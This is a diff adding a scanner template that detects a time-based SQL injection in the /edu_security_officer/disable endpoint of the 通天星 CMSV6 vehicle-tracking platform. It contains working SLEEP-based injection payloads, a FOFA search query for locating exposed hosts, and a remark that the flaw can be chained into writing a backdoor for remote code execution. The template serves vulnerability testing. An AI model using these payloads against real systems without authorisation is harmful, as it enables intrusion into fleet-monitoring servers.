@@ -1,0 +1,32 @@
+id: cmdsv6-disable-sqli
+
+info:
+  name: 通天星存在disable SQL注入
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    通天星CMSV6车载定位监控平台/edu_security_officer/disable接口处未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。该漏洞可配合任意文件读取获取网站绝对路径写入后门文件进行远程代码执行。
+    fofa: body="808gps"
+  reference:
+    - https://mp.weixin.qq.com/s/tDhahEF-Iu4ot8KIsU7XBg
+  tags: cmsv6,sqli
+  created: 2024/09/02
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%286%29%29%29kOIi%29
+    expression: response.status == 200 && response.body.bcontains(b'"result":0') && response.latency <= 7000 &&  response.latency >= 6000
+  r1:
+    request:
+      method: GET
+      path: /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%2810%29%29%29kOIi%29
+    expression: response.status == 200 && response.body.bcontains(b'"result":0') && response.latency <= 11000 &&  response.latency >= 10000
+  r2:
+    request:
+      method: GET
+      path: /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%286%29%29%29kOIi%29
+    expression: response.status == 200 && response.body.bcontains(b'"result":0') && response.latency <= 7000 &&  response.latency >= 6000
+expression: r0() && r1() && r2()
